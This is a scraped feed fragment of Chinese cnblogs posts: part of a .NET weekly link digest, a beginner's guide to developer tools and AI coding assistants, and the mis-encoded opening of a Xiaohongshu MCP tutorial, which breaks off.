target=\"_blank\">dotnet/maui</a>\n<ul>\n<li><a href=\"https://github.com/dotnet/maui/releases/tag/10.0.30\" rel=\"noopener nofollow\" target=\"_blank\">10.0.30</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/dotnet/orleans\" rel=\"noopener nofollow\" target=\"_blank\">dotnet/Orleans</a>\n<ul>\n<li><a href=\"https://github.com/dotnet/orleans/releases/tag/v3.8.0\" rel=\"noopener nofollow\" target=\"_blank\">v3.8.0</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/dotnet/SqlClient\" rel=\"noopener nofollow\" target=\"_blank\">dotnet/SqlClient</a>\n<ul>\n<li><a href=\"https://github.com/dotnet/SqlClient/releases/tag/v5.1.9\" rel=\"noopener nofollow\" target=\"_blank\">v5.1.9</a>， <a href=\"https://github.com/dotnet/SqlClient/releases/tag/v6.1.4\" rel=\"noopener nofollow\" target=\"_blank\">v6.1.4</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/googleapis/google-cloud-dotnet\" rel=\"noopener nofollow\" target=\"_blank\">googleapis/google-cloud-dotnet</a>\n<ul>\n<li><a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.BackupDR.V1-2.7.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.BackupDR.V1-2.7.0</a>，<a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.Compute.V1-3.22.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.Compute.V1-3.22。 0</a>， <a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.Config.V1-1.11.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.Config.V1-1.11. 0</a>， <a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.DevTools.ContainerAnalysis-3.12.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.DevTools.ContainerAnalysis-3.12. 0</a>， <a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.PubSub.V1-3.31.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.PubSub.V1-3.31. 0</a>， <a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.Spanner-5.10.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.Spanner-5.10. 0</a>， <a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.Spanner-5.11.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.Spanner-5.11. 0</a>， <a href=\"https://github.com/googleapis/google-cloud-dotnet/releases/tag/Google.Cloud.Speech.V2-1.7.0\" rel=\"noopener nofollow\" target=\"_blank\">Google.Cloud.Speech.V2-1.7. 0</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/microsoft/WindowsAppSDK\" rel=\"noopener nofollow\" target=\"_blank\">microsoft/WindowsAppSDK</a>\n<ul>\n<li><a href=\"https://github.com/microsoft/WindowsAppSDK/releases/tag/v1.7.7\" rel=\"noopener nofollow\" target=\"_blank\">v1.7.7</a>、<a href=\"https://github.com/microsoft/WindowsAppSDK/releases/tag/v1.8.4\" rel=\"noopener nofollow\" target=\"_blank\">v1.8.4</a>、<a href=\"https://github.com/microsoft/WindowsAppSDK/releases/tag/v2.0-exp4\" rel=\"noopener nofollow\" target=\"_blank\">v2. 0-exp4</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/newrelic/newrelic-dotnet-agent\" rel=\"noopener nofollow\" target=\"_blank\">newrelic/newrelic-dotnet-agent</a>    - <a href=\"https://github.com/newrelic/newrelic-dotnet-agent/releases/tag/v10.48.0\" rel=\"noopener nofollow\" target=\"_blank\">v10.48.0</a></li>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-dotnet-contrib\" rel=\"noopener nofollow\" target=\"_blank\">开放遥测/开放遥测点网贡献</a>\n<ul>\n<li><a href=\"https://github.com/open-telemetry/opentelemetry-dotnet-contrib/releases/tag/Instrumentation.AWS-1.14.2\" rel=\"noopener nofollow\" target=\"_blank\">Instrumentation.AWS-1.14.2</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/unoplatform/uno\" rel=\"noopener nofollow\" target=\"_blank\">unoplatform/uno</a>\n<ul>\n<li><a href=\"https://github.com/unoplatform/uno/releases/tag/6.4.242\" rel=\"noopener nofollow\" target=\"_blank\">6.4.242</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"文章幻灯片及更多内容\">文章、幻灯片及更多内容</h2>\n<h3 id=\"net-10-和-c-14-新增内容api-请求响应流水线的增强\">.NET 10 和 C# 14 新增内容：API 请求/响应流水线的增强</h3>\n<p><a href=\"https://blog.elmah.io/new-in-net-10-and-c-14-enhancements-in-apis-request-response-pipeline/\" rel=\"noopener nofollow\" target=\"_blank\">https://blog.elmah.io/new-in-net-10-and-c-14-enhancements-in-apis-request-response-pipeline/</a></p>\n<p>关于 ASP.NET Core 中 .NET 10 改进的 API 请求/响应流水线。</p>\n<h3 id=\"如何用-systemd-和-podman-部署-net-应用--红帽开发者\">如何用 systemd 和 Podman 部署 .NET 应用 | 红帽开发者</h3>\n<p><a href=\"https://developers.redhat.com/articles/2026/01/09/how-deploy-net-applications-systemd-and-podman\" rel=\"noopener nofollow\" target=\"_blank\">https://developers.redhat.com/articles/2026/01/09/how-deploy-net-applications-systemd-and-podman</a></p>\n<p>学习如何使用 systemd 和 Podman/Podman 四重组部署和运行 .NET 应用程序。</p>\n<h3 id=\"副驾驶回忆---visual-studio-博客\">副驾驶回忆 - Visual Studio 博客</h3>\n<p><a href=\"https://devblogs.microsoft.com/visualstudio/copilot-memories/\" rel=\"noopener nofollow\" target=\"_blank\">https://devblogs.microsoft.com/visualstudio/copilot-memories/</a></p>\n<p>副驾驶记忆功能的简要介绍。</p>\n<ul>\n<li><a href=\"https://docs.github.com/en/copilot/how-tos/use-copilot-agents/copilot-memory\" rel=\"noopener nofollow\" target=\"_blank\">启用和管理 Copilot 内存 - GitHub 文档</a></li>\n</ul>\n<h3 id=\"关于-publishaot-设置和运行时功能isdynamiccode-已提交属性\">关于 PublishAot 设置和运行时功能。IsDynamicCode 已提交属性</h3>\n<p><a href=\"https://zenn.dev/prozolic/articles/43631043eeaeca\" rel=\"noopener nofollow\" target=\"_blank\">https://zenn.dev/prozolic/articles/43631043eeaeca</a></p>\n<p>解释了“PublishAot”设置中的“RuntimeFeature.IsDynamicCodeCompiled”属性如何影响构建时间和调试执行。</p>\n<h3 id=\"我应该使用-nuget-lock-files---techguitarrapccóm\">我应该使用 NuGet Lock Files - tech.guitarrapc.cóm</h3>\n<p><a href=\"https://tech.guitarrapc.com/entry/2026/01/11/230000\" rel=\"noopener nofollow\" target=\"_blank\">https://tech.guitarrapc.com/entry/2026/01/11/230000</a></p>\n<p>对 NuGet 锁文件的解释及其必要性。</p>\n<h3 id=\"-通过net-应用读取我的号码卡信息可在-linux-上使用qiita\">. 通过.NET 应用读取我的号码卡信息(可在 Linux 上使用)——Qiita。</h3>\n<p><a href=\"https://qiita.com/yamaokunousausa/items/503eb3ae1ec1f35d972d\" rel=\"noopener nofollow\" target=\"_blank\">https://qiita.com/yamaokunousausa/items/503eb3ae1ec1f35d972d</a></p>\n<p>如何在 .NET 应用程序中加载我的号码卡信息。 它还涉及了它在 Linux 上的工作方式。</p>\n<h3 id=\"aws-现支持基于文件的-c-lambda-函数---techguitarrapccóm\">AWS 现支持基于文件的 C# Lambda 函数 - tech.guitarrapc.cóm</h3>\n<p><a href=\"https://tech.guitarrapc.com/entry/2026/01/10/230000\" rel=\"noopener nofollow\" target=\"_blank\">https://tech.guitarrapc.com/entry/2026/01/10/230000</a></p>\n<p>关于 AWS Lambda 对基于 C#文件程序的支持以及对.NET 10 的支持。</p>\n<h3 id=\"windows-应用的-ui-开发难吗-这个问题你可以用-blazor--tailwind-css-解决\">Windows 应用的 UI 开发难吗？ 这个问题，你可以用 Blazor × Tailwind CSS 解决</h3>\n<p><a href=\"https://zenn.dev/wogo_techblog/articles/811ec4e5c7a0e4\" rel=\"noopener nofollow\" target=\"_blank\">https://zenn.dev/wogo_techblog/articles/811ec4e5c7a0e4</a></p>\n<p>学习如何在你的 BlazorWebView(Blazor 混合)应用中使用 Tailwind CSS。</p>\n<h3 id=\"如何用net-maui-构建-android-小部件---net-博客\">如何用.NET MAUI 构建 Android 小部件 - .NET 博客</h3>\n<p><a href=\"https://devblogs.microsoft.com/dotnet/how-to-build-android-widgets-with-dotnet-maui/\" rel=\"noopener nofollow\" target=\"_blank\">https://devblogs.microsoft.com/dotnet/how-to-build-android-widgets-with-dotnet-maui/</a></p>\n<p>如何在 .NET MAUI 中实现 Android 小部件。 文章解释了实现过程，包括与应用程序的交互。</p>\n<h3 id=\"在-azure-云swa--functions--cosmos-db中为您的网站实现旧公告板qiita\">在 Azure 云(SWA + Functions + Cosmos DB)中为您的网站实现“旧公告板”——Qiita</h3>\n<p><a href=\"https://qiita.com/RamTuckey/items/f8e50b038e8b24df9c26\" rel=\"noopener nofollow\" target=\"_blank\">https://qiita.com/RamTuckey/items/f8e50b038e8b24df9c26</a></p>\n<p>Azure Static Web Apps and Azure Functions (Managed Functions) 以及 Cosmos DB 来实现传统的公告板。</p>\n<h3 id=\"在-c模块初始化器被调用之前---qiita\">在 C#模块初始化器被调用之前 - Qiita。</h3>\n<p><a href=\"https://qiita.com/RyotaMurohoshi/items/83d92945e05c7dad90a0\" rel=\"noopener nofollow\" target=\"_blank\">https://qiita.com/RyotaMurohoshi/items/83d92945e05c7dad90a0</a></p>\n<p>关于用 ModuleInitializer 初始化模块初始化器和静态构造器，初始化静态字段的顺序。</p>\n<h3 id=\"从net-memorystream-创建零副本二进制数据---gérald-barré\">从.NET MemoryStream 创建零副本二进制数据 - Gérald Barré</h3>\n<p><a href=\"https://www.meziantou.net/zero-copy-binarydata-creation-from-memorystream-in-dotnet.htm\" rel=\"noopener nofollow\" target=\"_blank\">https://www.meziantou.net/zero-copy-binarydata-creation-from-memorystream-in-dotnet.htm</a></p>\n<p>如何在从内存流创建二进制数据时进行零复制。</p>\n<h3 id=\"wpf--opencvsharp-创建了一款发送带有面部手势的-pdf-页面的应用---qiita\">WPF + OpenCvSharp 创建了一款“发送带有面部手势的 PDF 页面”的应用 - Qiita</h3>\n<p><a href=\"https://qiita.com/kerobot/items/0f5bad24daf91958de50\" rel=\"noopener nofollow\" target=\"_blank\">https://qiita.com/kerobot/items/0f5bad24daf91958de50</a></p>\n<p>描述使用 WPF 和 OpenCvSharp 创建一个识别面部手势并发送关键动作的应用程序。</p>\n<h3 id=\"copilot-为--windows-应用开发工作本地编辑-安心与说明\">Copilot 为 × Windows 应用开发工作：本地编辑 安心与说明</h3>\n<p><a href=\"https://zenn.dev/suusanex/articles/f5a5ca188f957d\" rel=\"noopener nofollow\" target=\"_blank\">https://zenn.dev/suusanex/articles/f5a5ca188f957d</a></p>\n<p>介绍 Visual Studio Code 及在 Visual Studio 中使用 Copilot，以及一些快速使用技巧。</p>\n<h3 id=\"c14-化合物分配超载\">[C#14] 化合物分配超载</h3>\n<p><a href=\"https://zenn.dev/peacockanderson/articles/3f4fbc24420036\" rel=\"noopener nofollow\" target=\"_blank\">https://zenn.dev/peacockanderson/articles/3f4fbc24420036</a></p>\n<p>C# 14 中复赋值算子超载的解释。</p>\n<h2 id=\"库仓库工具等\">库、仓库、工具等</h2>\n<h3 id=\"jsakamotodnx-zipsrcdnx-zipsrc-是一个-net-全局工具利用-gitignore-模式从项目中的源文件创建压缩包排除伪影依赖及其他内容-非源文件\">jsakamoto/dnx-zipsrc：“dnx zipsrc” 是一个 .NET 全局工具，利用 .gitignore 模式从项目中的源文件创建压缩包，排除伪影、依赖及其他内容 非源文件。</h3>\n<p>.gitignore 工具用于过滤不必要的文件和 ZIP 源代码。</p>\n<ul>\n<li><a href=\"https://zenn.dev/j_sakamoto/articles/fd3a6d583474db\" rel=\"noopener nofollow\" target=\"_blank\">我创建了一个 CLI 工具，只压缩源代码，且不会无意中包含构建工件</a></li>\n</ul>\n<h3 id=\"mattparkerdevsharpdbgsharpdbg-是一个-net-托管代码调试器支持完全用-cnet-实现的调试适配器协议\">MattParkerDev/sharpdbg：SharpDbg 是一个 .NET 托管代码调试器，支持完全用 C#/.NET 实现的调试适配器协议</h3>\n<p><a href=\"https://github.com/MattParkerDev/sharpdbg\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/MattParkerDev/sharpdbg</a></p>\n<p>一个支持以 .NET(C#)实现的数据适配器协议的 .NET 调试器。</p>\n<p><a href=\"https://x.com/mattparkerdev/status/2006535935610221030?s=12\" rel=\"noopener nofollow\" target=\"_blank\">https://x.com/mattparkerdev/status/2006535935610221030?s=12</a></p>\n<h3 id=\"评论工作室---visual-studio-市场\">评论工作室 - Visual Studio 市场</h3>\n<p><a href=\"https://marketplace.visualstudio.com/items?itemName=MadsKristensen.commentsvs\" rel=\"noopener nofollow\" target=\"_blank\">https://marketplace.visualstudio.com/items?itemName=MadsKristensen.commentsvs</a></p>\n<p>一个 Visual Studio 扩展，可以将 XML、文档、注释等格式化并显示成易读格式。</p>\n<p><a href=\"https://x.com/mkristensen/status/2009296580688421049?s=12&amp;t=ggvrrZ7oLogHyNoIGNgjbw\" rel=\"noopener nofollow\" target=\"_blank\">https://x.com/mkristensen/status/2009296580688421049?s=12&amp;t=ggvrrZ7oLogHyNoIGNgjbw</a></p>\n<h3 id=\"精选空白\">精选空白</h3>\n<p><a href=\"https://www.vsixgallery.com/extension/SelectedWhitespace.63944e24-4aa2-4d0a-8161-4b7eb9f39831/\" rel=\"noopener nofollow\" target=\"_blank\">https://www.vsixgallery.com/extension/SelectedWhitespace.63944e24-4aa2-4d0a-8161-4b7eb9f39831/</a></p>\n<p>Visual Studio 扩展，用于显示选定范围的空白字符。</p>\n<p><a href=\"https://x.com/mkristensen/status/2011164964372070798?s=12\" rel=\"noopener nofollow\" target=\"_blank\">https://x.com/mkristensen/status/2011164964372070798?s=12</a></p>\n<h2 id=\"今日人物\">今日人物</h2>\n<p><strong>肯尼斯·蓝·汤普逊</strong>（英语：Kenneth Lane Thompson，1943 年 2 月 4 日—），小名<strong>肯·汤普逊</strong>（英语：Ken Thompson），美国<a href=\"https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6\" rel=\"noopener nofollow\" target=\"_blank\">计算机科学</a>学者和工程师。<a href=\"https://zh.wikipedia.org/wiki/%E9%A7%AD%E5%AE%A2%E6%96%87%E5%8C%96\" rel=\"noopener nofollow\" target=\"_blank\">黑客文化</a>圈子通常称他为“ken”<a href=\"https://zh.wikipedia.org/wiki/%E8%82%AF%C2%B7%E6%B1%A4%E6%99%AE%E9%80%8A#cite_note-1\" rel=\"noopener nofollow\" target=\"_blank\">[1]</a>。在<a href=\"https://zh.wikipedia.org/wiki/%E8%B4%9D%E5%B0%94%E5%AE%9E%E9%AA%8C%E5%AE%A4\" rel=\"noopener nofollow\" target=\"_blank\">贝尔实验室</a>工作期间，汤普逊设计和实现了<a href=\"https://zh.wikipedia.org/wiki/Unix\" rel=\"noopener nofollow\" target=\"_blank\">Unix</a>操作系统。他创造了<a href=\"https://zh.wikipedia.org/wiki/B%E8%AF%AD%E8%A8%80\" rel=\"noopener nofollow\" target=\"_blank\">B 语言</a>——<a href=\"https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80\" rel=\"noopener nofollow\" target=\"_blank\">C 语言</a>的前身，而且他是<a href=\"https://zh.wikipedia.org/wiki/%E8%B2%9D%E7%88%BE%E5%AF%A6%E9%A9%97%E5%AE%A4%E4%B9%9D%E8%99%9F%E8%A8%88%E7%95%AB\" rel=\"noopener nofollow\" target=\"_blank\">Plan 9</a>操作系统的创造者和开发者之一。2006 年，汤普逊进入<a href=\"https://zh.wikipedia.org/wiki/Google\" rel=\"noopener nofollow\" target=\"_blank\">Google</a>公司工作，与他人共同设计了<a href=\"https://zh.wikipedia.org/wiki/Go\" rel=\"noopener nofollow\" target=\"_blank\">Go 语言</a>。他与<a href=\"https://zh.wikipedia.org/wiki/%E4%B8%B9%E5%B0%BC%E6%96%AF%C2%B7%E9%87%8C%E5%A5%87\" rel=\"noopener nofollow\" target=\"_blank\">丹尼斯·里奇</a>同为 1983 年<a href=\"https://zh.wikipedia.org/wiki/%E5%9B%BE%E7%81%B5%E5%A5%96\" rel=\"noopener nofollow\" target=\"_blank\">图灵奖</a>得主。</p>\n<p>此外，肯·汤普逊还参与过<a href=\"https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F\" rel=\"noopener nofollow\" target=\"_blank\">正则表达式</a>和<a href=\"https://zh.wikipedia.org/wiki/UTF-8\" rel=\"noopener nofollow\" target=\"_blank\">UTF-8</a>编码的设计，改进了文本编辑器<a href=\"https://zh.wikipedia.org/w/index.php?title=QED_(%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8)&amp;action=edit&amp;redlink=1\" rel=\"noopener nofollow\" target=\"_blank\">QED</a>，创造了<a href=\"https://zh.wikipedia.org/wiki/Ed_(%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8)\" rel=\"noopener nofollow\" target=\"_blank\">ed</a>编辑器。他曾制造过专门用于下<a href=\"https://zh.wikipedia.org/wiki/%E5%9B%BD%E9%99%85%E8%B1%A1%E6%A3%8B\" rel=\"noopener nofollow\" target=\"_blank\">国际象棋</a>的电脑“<a href=\"https://zh.wikipedia.org/w/index.php?title=Belle_(%E6%9C%BA%E5%99%A8)&amp;action=edit&amp;redlink=1\" rel=\"noopener nofollow\" target=\"_blank\">Belle</a>”，并建立了<a href=\"https://zh.wikipedia.org/w/index.php?title=%E6%AE%8B%E5%B1%80%E6%95%B0%E6%8D%AE%E5%BA%93&amp;action=edit&amp;redlink=1\" rel=\"noopener nofollow\" target=\"_blank\">残局数据库</a>。</p>\n<p><img alt=\"肯尼斯·蓝·汤普逊\" src=\"https://img2024.cnblogs.com/blog/997046/202602/997046-20260215203042576-1304543210.jpg\" /></p>\n<h2 id=\"c-net-交流群\">C# .NET 交流群</h2>\n<p>相信大家在开发中经常会遇到一些性能问题，苦于没有有效的工具去发现性能瓶颈，或者是发现瓶颈以后不知道该如何优化。之前一直有读者朋友询问有没有技术交流群，但是由于各种原因一直都没创建，现在很高兴的在这里宣布，我创建了一个专门交流.NET 性能优化经验的群组，主题包括但不限于：</p>\n<ul>\n<li>如何找到.NET 性能瓶颈，如使用 APM、dotnet tools 等工具</li>\n<li>.NET 框架底层原理的实现，如垃圾回收器、JIT 等等</li>\n<li>如何编写高性能的.NET 代码，哪些地方存在性能陷阱</li>\n</ul>\n<p>希望能有更多志同道合朋友加入，分享一些工作中遇到的.NET 问题和宝贵的分析优化经验。<strong>目前一群已满，现在开放二群。</strong>可以加我 vx，我拉你进群: <strong>ls1075</strong> 另外也创建了 <strong>QQ Group</strong>: 687779078，欢迎大家加入。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 20:36</span>&nbsp;\n<a href=\"https://www.cnblogs.com/InCerry\">InCerry</a>&nbsp;\n阅读(<span id=\"post_view_count\">134</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "入门分享篇：一、工欲善其事，必先利其器",
      "link": "https://www.cnblogs.com/chenyouyuan/p/19618451",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/chenyouyuan/p/19618451\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 18:23\">\n    <span>入门分享篇：一、工欲善其事，必先利其器</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本次分享，面向接触计算机 or 机器人软件开发 or 嵌入式软件开发 的程序员 学习过程中好用的工具\n如果大家还有其他好用的工具也欢迎分享\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"入门分享篇一工欲善其事必先利其器\">入门分享篇：一、工欲善其事，必先利其器</h1>\n<blockquote>\n<p>本次分享，面向接触计算机 or 机器人软件开发 or 嵌入式软件开发 的程序员 学习过程中好用的工具</p>\n<p>如果大家还有其他好用的工具也欢迎分享</p>\n</blockquote>\n<h2 id=\"磨刀不误砍柴功熟悉你的电脑问题检索思维工具\">磨刀不误砍柴功：熟悉你的电脑、问题检索、思维工具</h2>\n<h3 id=\"学会科学的解决问题和有效的问问题\">学会科学的解决问题和有效的问问题</h3>\n<p>虽然讲的是黑客的提问方法，但其实是相通的。</p>\n<p><a href=\"https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md\" rel=\"noopener nofollow\" target=\"_blank\">How-To-Ask-Questions-The-Smart-Way/README-zh_CN.md at main · ryanhanwu/How-To-Ask-Questions-The-Smart-Way</a></p>\n<h4 id=\"tips如何有效的使用ai工具\">tips:如何有效的使用ai工具？</h4>\n<p>时代在飞速的发展和变化，一切重复性的工作都在逐渐被ai所取代，我们应当做的是着重于利用ai去在ai难以替代的优化和创造性的工作上下功夫。</p>\n<p>在现代ai可以很轻松的帮我们解决从0到1的问题，那问题就集中在我们如何去突破这个1？</p>\n<p>首先基础仍然很重要，你能够创造出什么样的东西仍然取决于你对基础知识的了解程度，当然现在你开始一个项目也不一定需要提前把所有知识全部掌握，但至少你开始做你的项目之前得知道你需要用到一些什么东西，你需要先搭建起一个宏观的实现某一功能的认知框架。在项目开始之前务必做好一定程度的搜索调研</p>\n<p>第二是清晰表述你的需求的能力，可以多尝试通过思维导图的方式来捋清楚自己的需求和逻辑</p>\n<p>第三是独立检索和判断能力，ai不一定能够精确的搜索到你所需要的内容，给出的建议也不一定是最优解，谨慎使用ai托管！（甚至后续还有植入广告的风险）</p>\n<p>第四清晰的知道不同的ai工具擅长什么，比如豆包擅长语言方面的处理，claude擅长编程，那你就可以吧你的需求跟豆包交流，让它纠正你的措辞，再去和claude交流，或者你可以人claude使用项目制的方式，读取你的需求文档，和你对接需求，修正需求等等</p>\n<p>第五 及时记录你的想法和所学所思，ai时代虽然相当于你的外置大脑，但是如果你什么都需要依靠ai来辅助的话，效率会相当低下，每次忘记一个东西又得问一遍ai。</p>\n<h3 id=\"入门工具指南\">入门工具指南</h3>\n<ol>\n<li>\n<p>你可以使用cursor、copilot、codex等各种各样的直接交互的ai编程工具，这比你复制代码给对话式ai然后再粘贴回来高效的多</p>\n<p>这些大部分都有教育优惠或者教育免费的政策</p>\n<p>最方便的你可以只用下载一个vscode，在vscode的拓展插件中下载copilot，再去github的官网申请教育特权，你就能获得一年的免费使用copilot的权限（具体获得方法自行搜索，主要是你得用英文，你的学生证明全部都得是翻译成英文的，也可以手写）</p>\n</li>\n<li>\n<p>学会使用github，有时候你可能上不去github，你想要最简单不花钱，稳定的方法就是去微软商店下steam++（watt toolkit），魔法（会魔法的自然能学会就不多梭啦）</p>\n</li>\n<li>\n<p>建议你选一款适合自己的笔记软件（markdowm），比如obsidian、typora</p>\n<p>我是配合着使用的，obsidian有强大的搜索功能，typora可以有良好的书写体验（typora有非常多的主题可以选择，你也可以配置你的图床，自动上传你粘贴到typora的图片到云端，这样就能不用担心图片的分享问题啦</p>\n</li>\n<li>\n<p>建议你有一款合适的思维导图软件，project graph /Xmind都可以，尽量选界面脱俗一些，这在一些比赛要提交的报告中有很好绘图说明作用，在平时也可以给你提供思维向导</p>\n</li>\n<li>\n<p>建议你在博客园注册一个个人账户，发一发你的学习记录，可以当成一个知识网盘，也可以积累一定的粉丝和阅读量，可能有助于你后续找工作，tips:可以使用Cnblogs-Theme-SimpleMemory自定义你的博客页面噢</p>\n</li>\n<li>\n<p>git的学习相当重要！比赛/项目中的版本迭代很快，你如果没有git工具做版本管理，很容易丢失了原来的代码，喊天菩萨都没有用辣，学习教程在”参考书目/vscode_git本地代码版本管理及远程仓库保存“，你可以在vscode中安装git graph插件更直观的看到你的版本变化</p>\n</li>\n</ol>\n<h2 id=\"vscode-宇宙级ide\">vscode 宇宙级ide</h2>\n<p><a href=\"https://code.visualstudio.com/\" rel=\"noopener nofollow\" target=\"_blank\">Visual Studio Code - The open source AI code editor</a></p>\n<p>几乎所有热门的开发都可以在vscode上找到插件</p>\n<p>其自带的copilot也是十分方便的ai编程助手</p>\n<h2 id=\"git使用指南\">git使用指南</h2>\n<p><a href=\"https://bbs.robomaster.com/article/55660?source=4\" rel=\"noopener nofollow\" target=\"_blank\">【分享】如何使用VScode+git进行本地代码版本管理及远程仓库保存-RoboMaster 社区</a></p>\n<h2 id=\"笔记记录工具-typora\">笔记记录工具 typora</h2>\n<p>超级顺手的markdowm书写体验</p>\n<h3 id=\"markdowm语法的学习\">markdowm语法的学习</h3>\n<p><a href=\"https://markdown.com.cn/basic-syntax/\" rel=\"noopener nofollow\" target=\"_blank\">Markdown 基本语法 | Markdown 教程</a></p>\n<h3 id=\"typora配置图床\">typora配置图床</h3>\n<p><a href=\"https://zhuanlan.zhihu.com/p/346410333\" rel=\"noopener nofollow\" target=\"_blank\">(13 封私信 / 80 条消息) Typora+图床详解（小白都能学得会） - 知乎</a></p>\n<h2 id=\"笔记检索链接工具-obsidian\">笔记检索/链接工具 obsidian</h2>\n<p>强大的检索功能和链接反链接功能</p>\n<h3 id=\"自动同步和上传的git插件\">自动同步和上传的git插件</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1qCh9zrEKq/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f553a12b04c16a678ddc0064cc04563c\" rel=\"noopener nofollow\" target=\"_blank\">obsidian使用git进行多平台同步_哔哩哔哩_bilibili</a></p>\n<h2 id=\"思维导图工具-project-graph\">思维导图工具 project graph</h2>\n<p><a href=\"https://www.bilibili.com/video/BV1y2xdzUEXa/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f553a12b04c16a678ddc0064cc04563c\" rel=\"noopener nofollow\" target=\"_blank\">project-graph 2.0更新介绍：prg文件/树形布局增强/连线增强/窗口新玩法_哔哩哔哩_bilibili</a></p>\n<p>强大的可视化和高度自定义的思维导图软件！</p>\n<h2 id=\"我们热血沸腾的组合技\">我们热血沸腾的组合技</h2>\n<p>typora + obsidian + project graph</p>\n<h2 id=\"博客园\">博客园</h2>\n<p><a href=\"https://www.cnblogs.com/\" target=\"_blank\">博客园 - 开发者的网上家园</a></p>\n<h3 id=\"创造独属于你的博客\">创造独属于你的博客！</h3>\n<p><a href=\"https://github.com/BNDong/Cnblogs-Theme-SimpleMemory\" rel=\"noopener nofollow\" target=\"_blank\">BNDong/Cnblogs-Theme-SimpleMemory: 🍭　Cnblogs theme _ Basic theme : SimpleMemory</a></p>\n<p><a href=\"https://www.cnblogs.com/lingyunvoid/p/beautify.html\" target=\"_blank\">博客园美化「详细教程+代码配置」 - 凌云_void - 博客园</a></p>\n<h2 id=\"edge浏览器\">edge浏览器</h2>\n<p>大多数浏览器都有插件功能，插件真的很好用！</p>\n<h3 id=\"青柠起始页\">青柠起始页</h3>\n<h3 id=\"沉浸式翻译\">沉浸式翻译</h3>\n<h3 id=\"global-speed\">global speed</h3>\n<blockquote>\n<p>路虽远，行则将至✨</p>\n</blockquote>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 18:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/chenyouyuan\">ChenYY~</a>&nbsp;\n阅读(<span id=\"post_view_count\">101</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "零代码零基础！小红书MCP全自动化运营【保姆级安装教程】",
      "link": "https://www.cnblogs.com/ChenAI-TGF/p/19621617",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ChenAI-TGF/p/19621617\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäºŽ 2026-02-17 13:49\">\n    <span>é›¶ä»£ç é›¶åŸºç¡€ï¼å°çº¢ä¹¦MCPå…¨è‡ªåŠ¨åŒ–è¿è¥ã€ä¿å§†çº§å®‰è£…æ•™ç¨‹ã€‘</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        å°çº¢ä¹¦MCPè‡ªåŠ¨åŒ–å·¥å…·éƒ¨ç½²æŒ‡å— 